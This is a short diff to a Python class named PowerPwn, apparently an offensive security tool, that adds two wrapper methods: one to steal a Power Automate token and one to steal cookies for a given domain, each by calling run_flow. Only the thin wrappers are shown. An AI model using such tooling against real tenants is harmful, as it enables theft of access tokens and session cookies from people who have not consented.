@@ -60,3 +60,11 @@ class PowerPwn:
     def cleanup(self) -> FlowResults:
         flow_args = FlowArguments(FlowToRun=FlowToRunEnum.CLEANUP)
         return self.run_flow(flow_args)
+
+    def steal_power_automate_token(self) -> FlowResults:
+        flow_args = FlowArguments(FlowToRun=FlowToRunEnum.STEAL_POWER_AUTOMATE_TOKEN)
+        return self.run_flow(flow_args)
+
+    def steal_cookie(self, fqdn: str) -> FlowResults:
+        flow_args = FlowArguments(FlowToRun=FlowToRunEnum.STEAL_COOKIE, StealCookieFQDN=fqdn)
+        return self.run_flow(flow_args)
